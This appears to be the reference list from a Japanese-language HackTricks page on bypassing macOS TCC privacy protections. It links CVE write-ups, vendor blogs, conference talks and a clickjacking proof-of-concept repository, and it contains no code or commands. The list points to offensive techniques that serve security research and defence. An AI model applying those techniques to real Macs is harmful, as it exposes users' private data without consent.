- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework の bypass](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [偶発的および意図的な macOS TCC ユーザープライバシー保護の bypass](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass（元の報告）](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [世界のどこにいるの、カルメン・サンディエゴ？: macOS の Location Services の悪用](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass による iCloud データの窃取](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c`（SQLITE_ENABLE_SQLLOG 環境変数）](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD 環境変数の許可 entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware で発見された Zero-Day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: 「Mac で起きたことは Apple の iCloud に残るのか?!」 - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [新たな macOS vulnerability「powerdir」によって、ユーザーデータへの不正アクセスが可能に](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [ホームディレクトリを変更して TCC を bypassする（別名 CVE-2020-27937）](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [音楽を再生して TCC を bypassする（別名 CVE-2020-29621）](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Firefoxを盗む方法](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS で Telegram を使った TCC bypass](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple の脆弱性を解明: diskarbitrationd と storagekitd の監査 パート2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks と CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X で環境変数を設定する方法](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs による TCC bypass と privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database への上書きマウントによる TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS のプライバシー機構を bypassする20以上の方法](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC に対する圧勝 - macOS のプライバシー機構を bypassする新たな20以上の方法](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Spotlight から Apple Intelligence まで — 0day を悪用して macOS AI の基盤となるデータを窃取](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
